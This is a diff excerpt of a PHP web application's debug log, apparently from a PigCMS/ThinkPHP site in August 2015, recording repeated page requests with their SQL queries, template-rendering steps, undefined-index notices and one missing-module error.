+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003907s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045898s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.033203s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.079101s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.080078s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081055s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.082031s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003907s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.083008s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:25:35+08:00 ] 121.42.0.38 /index.php
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000000s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045899s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.035156s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.081055s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.082032s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.083008s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.083008s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.083985s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:25:41+08:00 ] 121.42.0.38 /index.php
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.005859s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.048828s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.050781s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032226s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.083007s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.083984s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.084961s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.084961s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.085937s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000977s ]
+
+[ 2015-08-22T22:25:43+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000000s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.003906s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.003906s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001954s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.045898s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.047851s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031250s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.080078s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.080078s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081054s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.082031s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.083007s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:25:45+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.001954s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002929s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.046875s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.047852s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032226s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.080078s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.080078s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081055s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.082031s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.083008s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000000s ]
+
+[ 2015-08-22T22:25:53+08:00 ] ERR: (ThinkException) 无法加载模块:vote
+[ 2015-08-22T22:26:09+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003907s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.046875s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.047852s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031250s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.079102s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.080079s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081055s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.081055s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.082032s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:26:17+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045899s ]
